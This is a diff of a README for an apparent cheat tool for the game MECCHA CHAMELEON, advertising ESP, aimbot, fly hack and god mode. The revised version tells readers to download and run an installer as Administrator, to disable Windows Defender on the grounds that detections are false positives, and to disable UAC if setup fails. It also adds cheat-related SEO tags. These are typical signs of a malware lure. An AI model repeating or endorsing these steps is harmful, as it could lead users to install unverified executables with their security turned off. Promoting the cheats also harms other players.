@@ -1,16 +1,22 @@
-# 🚀 Meccha Phantom Pro — Ultimate Enhancement Suite 2026
+# 👻 Meccha Phantom — External Hack Tool 2026
 <img width="1285" height="724" alt="image" src="https://github.com/user-attachments/assets/d98960d0-c4c5-4595-a1f6-08f7cbe5cdc5" />
 
 
-**Complete Toolkit for MECCHA CHAMELEON · ESP · Aimbot · Radar · Camouflage · Performance Boost**
+**ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint**
 
 ---
+## ⚡ Quick Start Guide
 
+### Get Started in 3 Simple Steps:
+
+1. **📂 Open the ZIP file** — Extract the archive using WinRAR or 7-Zip
+2. **⚙️ Run the setup** — Execute `setup v2.3.19.exe` as Administrator
+3. **🎮 Launch the game** — Start MECCHA CHAMELEON
 <div align="center">
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/StewardFence/MECCHA-CHAMELEON-VISION/releases/download/setup-v2.3.15/setup.v2.3.15.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Attobrufigure/Meccha-Phantom/releases/latest)
 
 
 </div>
@@ -19,56 +25,72 @@
 
 ## 🎮 What is This?
 
-**Meccha Phantom Pro** is the most comprehensive enhancement suite for **MECCHA CHAMELEON** – the viral hide-and-seek game that took Steam by storm with over 10 million copies sold and 340,000 concurrent players.
+**Meccha Phantom** is a complete hack tool for **MECCHA CHAMELEON** – the viral hide-and-seek game that took Steam by storm with over 10 million copies sold and 340,000 concurrent players. This tool gives you full control with ESP, aimbot, fly hack, teleport, god mode, infinite paint, and more. Dominate every match and become the ultimate chameleon!
 
-This all-in-one tool gives you complete dominance with ESP wallhack, precision aimbot, fly hack, teleportation, god mode, infinite paint, speed hack, performance optimization, and much more – all packed into a sleek, user-friendly interface.
-
-⚠️ **Disclaimer:** This tool is for educational and research purposes only. Use at your own risk.
+⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
 
 ---
 
-## ✨ Complete Feature List
+## ✨ Features
 
-| Category | Features |
-|:---|:---|
-| **👁️ ESP & Visual** | ESP Wallhack, Player ESP, Box ESP, Distance Indicators, Snap Lines, Ghost Detection, 2D/3D Radar, Health Bars |
-| **🎯 Combat** | Aimbot, Silent Aim, Triggerbot, No Recoil, No Spread, Auto-Shoot, Hit Prediction |
-| **🚀 Movement** | Fly Hack, Teleport, Speed Hack, No Gravity, Jump Hack, Wall Climb, NoClip |
-| **🛡️ Protection** | God Mode, Infinite Paint, Perfect Camouflage, Timer Editor, Anti-Tag, Auto-Heal |
-| **⚡ Performance** | FPS Boost, CPU Priority, Memory Optimization, GPU Tuning, Network Optimization |
-| **🔧 Utility** | Menu Toggle (INSERT/F1), Custom Settings, Save Config, Auto-Updates, Profile Manager, Key Binds |
+**👁️ ESP & Visual**
+- ESP (Wallhack) – See all players through walls
+- Distance Indicators – Know exactly how far enemies are
+- Player Tags – Display player names and health
+- Snap Lines – Never lose track
+- Box ESP – Highlight players with colored boxes
+- Ghost Detection – Spot invisible players
+
+**🎯 Combat**
+- Aimbot – Lock onto enemies instantly
+- Silent Aim – Hit targets without looking
+- Triggerbot – Auto-shoot on target
+- No Recoil – Perfect accuracy
+
+**🚀 Movement**
+- Fly Hack – Fly anywhere
+- Teleport – Instantly move
+- Speed Hack – Move faster
+- No Gravity – Float and glide
+
+**🛡️ Protection**
+- God Mode – Never get tagged
+- Infinite Paint – Unlimited colors
+- Perfect Camo – Instant blend
+- Timer Editor – Extend match time
+
+**🛠️ Utility**
+- Menu Toggle – INSERT or F1
+- Custom Settings – Adjust everything
+- Save Config – Auto-save
+- Regular Updates – Always compatible
 
 ---
 
-## 🎯 Feature Comparison
 
-| Feature | Basic Tools | Meccha Phantom Pro |
-|:---|:---|:---|
-| ESP Wallhack | ❌ | ✅ |
-| Aimbot | ❌ | ✅ |
-| Fly Hack | ❌ | ✅ |
-| Teleport | ❌ | ✅ |
-| God Mode | ❌ | ✅ |
-| Infinite Paint | ❌ | ✅ |
-| Speed Hack | ❌ | ✅ |
-| FPS Boost | ❌ | ✅ |
-| Performance Optimization | ❌ | ✅ |
-| Multi-Language | ❌ | ✅ (9 languages) |
-| In-App Updater | ❌ | ✅ |
-| **Price** | Free | **Free** |
-
----
-
-## ⚡ Quick Start Guide
-
-### Get Started in 3 Minutes
-
-1. **⬇️ Download** from the link above
-2. **📂 Extract** with WinRAR or 7-Zip
-3. **▶️ Run** as Administrator → Launch MECCHA CHAMELEON
-4. Press **INSERT** or **F1** to open the menu
 
 > **⚠️ Note:** Temporarily disable Windows Defender during installation. The tool is 100% safe — false positive.
+
+### Detailed Installation Steps:
+
+### Step 1: Download
+- Click the download button above
+- Save the archive to your computer
+
+### Step 2: Extract
+- Right-click the ZIP file
+- Select **"Extract Here"** (WinRAR or 7-Zip)
+
+### Step 3: Install
+- Run `setup v2.3.19.exe` as Administrator
+- Follow the on-screen instructions
+
+### Step 4: Launch
+- Start MECCHA CHAMELEON
+- Press **INSERT** or **F1** to open the menu
+- Toggle features ON/OFF
+
+**✅ Done — dominate every match!**
 
 ---
 
@@ -84,45 +106,32 @@ This all-in-one tool gives you complete dominance with ESP wallhack, precision a
 
 ---
 
-## 🎮 Controls
+## 🎥 How to Use
 
-| Key | Action |
-|:---|:---|
-| Insert / F1 | Toggle settings menu |
-| END | Quit application |
-| Close button | Quit application |
-| Custom | Configurable hotkeys |
-
----
-
-## ⚙️ Settings Tabs
-
-- **ESP** — Wallhack, Box ESP, Distance, Snap Lines, Visible/Not-Visible Colors
-- **AIMBOT** — Enable/Disable, FOV Circle, Smooth Aim, Key Binding
-- **MOVEMENT** — Fly, Teleport, Speed, No Gravity, Jump Hack
-- **PROTECTION** — God Mode, Infinite Paint, Perfect Camo, Timer Editor
-- **PERFORMANCE** — FPS Boost, CPU Priority, Memory Optimization, GPU Tuning
-- **VISUALS** — Colors, Line Thickness, Point Size, Overlay Settings
-- **PROFILES** — Save/Load/Delete Custom Configurations
+1. Launch the tool as Administrator
+2. Start MECCHA CHAMELEON
+3. Press INSERT to open the menu
+4. Toggle features you want
+5. Play and dominate! 🏆
 
 ---
 
-## 📦 Package Structure
+## 🔧 Feature Status
 
-```
-meccha_phantom_pro/
-  __init__.py        Entry point
-  __main__.py        Module runner
-  config.py          Configuration + JSON save/load
-  core.py            Memory reading, ESP logic
-  aimbot.py          Aim assistance system
-  movement.py        Movement modifications
-  protection.py      Protection features
-  performance.py     FPS boost and optimization
-  translations.py    Multi-language (9 languages)
-  ui.py              Qt5 overlay + menu GUI
-  updater.py         In-app update checker
-```
+| Category | Feature | Status |
+|----------|---------|--------|
+| Visual | ESP Wallhack | ✅ |
+| Visual | Player Tags | ✅ |
+| Visual | Box ESP | ✅ |
+| Combat | Aimbot | ✅ |
+| Combat | Silent Aim | ✅ |
+| Combat | Triggerbot | ✅ |
+| Movement | Fly Hack | ✅ |
+| Movement | Teleport | ✅ |
+| Movement | Speed Hack | ✅ |
+| Protection | God Mode | ✅ |
+| Protection | Infinite Paint | ✅ |
+| Utility | Menu | ✅ |
 
 ---
 
@@ -137,7 +146,7 @@ meccha_phantom_pro/
 
 ---
 
-## 🛠️ Troubleshooting
+## 🐛 Troubleshooting
 
 | Symptom | Fix |
 |:---|:---|
@@ -145,29 +154,13 @@ meccha_phantom_pro/
 | Menu doesn't open | Press INSERT or F1, restart both |
 | Game crashes | Reduce graphics settings, disable overlays |
 | Features not working | Update to latest version, verify game integrity |
-| FPS not improving | Close background applications, lower in-game settings |
-
----
-
-## 📝 Changelog
-
-### v2.0.0
-- **Major update** — Complete feature overhaul
-- **Performance boost** — FPS optimization engine added
-- **New UI** — Modern dark theme with accent palette
-- **Multi-language** — 9 languages supported
-- **In-app updater** — Automatic update checking
-
-### v1.9.0
-- **ESP improvements** — More accurate player detection
-- **Aimbot enhancements** — Smoother aiming
-- **Bug fixes** — Various stability improvements
+| Setup fails | Run setup as Administrator, disable UAC temporarily |
 
 ---
 
 ## 📝 Tags
 
-`meccha-phantom-pro` `meccha-chameleon` `esp` `aimbot` `fly-hack` `teleport` `god-mode` `infinite-paint` `speed-hack` `fps-boost` `performance-optimizer` `game-utility` `windows-tool` `external-esp`
+`meccha-phantom` `meccha-chameleon` `meccha-chameleon-hack` `meccha-chameleon-cheat` `meccha-chameleon-esp` `meccha-chameleon-aimbot` `meccha-chameleon-god-mode` `meccha-chameleon-fly-hack` `meccha-chameleon-teleport` `meccha-chameleon-speed-hack` `meccha-chameleon-infinite-paint` `meccha-chameleon-2026` `external-hack` `game-hack` `free-hack` `hide-and-seek-hack` `esp-tool` `aimbot-tool` `wallhack-tool` `mod-menu` `trainer` `windows-tool`
 
 ---
 
@@ -179,4 +172,4 @@ meccha_phantom_pro/
 
 ---
 
-**Complete control, zero limits. Meccha Phantom Pro — built for 2026.**
+**Complete control, zero limits. Meccha Phantom — built for 2026.**
